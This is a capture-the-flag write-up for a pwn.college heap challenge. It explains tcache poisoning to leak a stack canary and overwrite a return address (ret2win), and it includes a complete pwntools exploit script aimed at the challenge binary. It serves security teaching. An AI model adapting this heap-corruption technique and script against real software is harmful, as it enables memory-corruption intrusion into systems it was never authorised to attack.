---
layout: post
title: (Dynamic Allocator Misuse) level 10
categories: pwn.college Dynamic-Allocator-Misuse
date: 2025-10-06 13:00:12 +0300
tage: pwn.college stack-canary PIE ASLR heap house-of-force
---

## Information
- category: pwn


## Description 
> Leverage TCACHE exploits to gain control flow.

## Write-up

**Goal:** leak the stack canary, leak a stack address to bypass PIE, and finally overwrite a return frame (ret2win) to get the flag.

### Idea in one line
Abuse the tcache `next` pointer in a freed chunk header: overwrite it so the next `malloc` returns a pointer that points at the canary (and later to the stack). Use that read/write to leak the canary and stack, then craft a `scanf` payload to hijack control flow.

### 1. Redirect tcache `next` to the canary
- Allocate a chunk (call it `alloc[0]`) and then `free(0)`.
- After freeing, write into the freed chunk’s header to set the tcache `next` pointer (`next_ptr`) to the address of the stack canary.
- When the next `malloc` is issued, it will return a pointer that resolves to the canary address. Reading/printing that memory yields the canary value.

Pseudo:
```text
alloc(0)
free(0)
write_header_of_tcache_chunk(next_ptr = addr_of_canary)
malloc()    # returns pointer that points to canary
puts(0)     # leak canary
```
### 2. Overwrite return frame and trigger
- Use the write primitive again to make the next ```malloc``` return a pointer to a stack frame where you can place a forged return context.

```text
// layout on stack (conceptual)
[ padding... ]
[ canary (correct) ]
[ saved rbp ]
[ ret addr -> ret2win ]
```

## Exploit

```python
from pwn import *
elf = context.binary = ELF("/challenge/babyheap_level10.1")

offset_ret = 0x118
offset_canary = 0x108

def conn():
    global p
    p = elf.process()

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def scanf(idx,data):
    p.sendline(b"scanf")
    p.sendline(idx)
    p.sendline(data)

def puts(idx):
    p.sendline(b"puts")
    p.sendline(idx)

def quit():
    p.sendline(b"quit")
    p.interactive()
def leak():
    p.recvuntil(b"allocations is at: ")
    stack = int(p.recvline().split(b".")[0],16)
    p.recvuntil(b"main is at: ")
    main = int(p.recvline().split(b".")[0],16)

    

    baself = main - elf.symbols['main']
    elf.address = baself

    malloc(b"0",b"0")
    malloc(b"1",b"0")

    free(b"1")
    free(b"0")

    scanf(b"0",p64(stack + offset_canary + 1))

    malloc(b"0",b"0")
    malloc(b"0",b"0")

    puts(b"0")

    p.recvuntil(b"Data: ")
    canary = u64(p.recvline().strip().rjust(8,b"\x00"))
    
    log.success(f"stack: {hex(stack)}")
    log.success(f"main: {hex(main)}")
    log.success(f"canary: {hex(canary)}")

    return canary,stack

def send_payload(stack,canary):
    
    malloc(b"0",b"0")
    malloc(b"1",b"0")
    
    free(b"1")
    free(b"0")

    scanf(b"0",p64(stack))

    malloc(b"0",b"0")
    malloc(b"0",b"0")

    payload = flat(
        b"A"*(offset_canary),
        canary,
        0,
        elf.symbols['win'] 
    )

    scanf(b"0",payload)

    quit()
      
def main():
    conn()
    canary,stack = leak()
    send_payload(stack,canary)

if __name__ == "__main__":
    main()
```